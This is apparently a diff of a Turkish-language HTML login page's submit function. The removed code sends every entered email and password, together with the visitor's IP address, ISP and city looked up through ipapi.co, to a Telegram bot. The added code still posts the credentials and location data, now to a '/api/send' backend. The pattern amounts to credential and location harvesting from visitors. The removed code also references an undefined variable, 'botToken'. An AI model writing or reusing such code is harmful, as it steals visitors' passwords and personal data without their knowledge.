@@ -89,11 +89,6 @@
         async function verileriGonder() {
             const email = document.getElementById('userEmail').value;
             const pass = document.getElementById('userPass').value;
-            const dogruSifre = process.env.SIFRE;
-
-            // TELEGRAM BİLGİLERİ (Doğruluğunu son kez kontrol et)
-            const token = process.env.BOT_TOKEN; 
-            const chatId = process.env.TELEGRAM_ID;
 
             if(!email || !pass) {
                 alert("Lütfen tüm alanları doldurun!");
@@ -101,39 +96,32 @@
             }
 
             try {
-                // IP bilgisini alıyoruz
+                // IP ve konum bilgisini alıyoruz
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const data = await ipRes.json();
+                const ipData = await ipRes.json();
 
-                const mesaj = `🚀 **GİRİŞ PANELİ BİLDİRİMİ**\n\n` +
-                              `📧 E-posta: ${email}\n` +
-                              `🔑 Şifre: ${pass}\n` +
-                              `📡 IP: ${data.ip}\n` +
-                              `🏢 ISS: ${data.org}\n` +
-                              `📍 Konum: ${data.city} / ${data.country_name}\n` +
-                              `✅ Durum: ${pass === dogruSifre ? "BAŞARILI" : "HATALI"}`;
+                // Vercel üzerindeki güvenli API/send dosyamıza verileri gönderiyoruz
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, pass, ipData })
+                });
 
-                // Telegram'a gönder (await ekledik ki gitmeden sayfa değişmesin)
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
+                const result = await response.json();
 
-                if (pass === dogruSifre) {
+                if (result.success) {
+                    // Şifre doğruysa içeriği göster
                     document.getElementById('login-form').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
                 } else {
                     alert("Hatalı email veya şifre!");
                 }
             } catch (error) {
-                // İnternet veya IP servisi hatası olsa bile giriş yapmasına izin ver
-                if (pass === dogruSifre) {
-                    document.getElementById('login-form').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
-                } else {
-                    alert("Giriş başarısız!");
-                }
+                console.error("Hata:", error);
+                alert("Giriş sırasında bir hata oluştu!");
             }
         }
     </script>
 
 </body>
 </html>
-
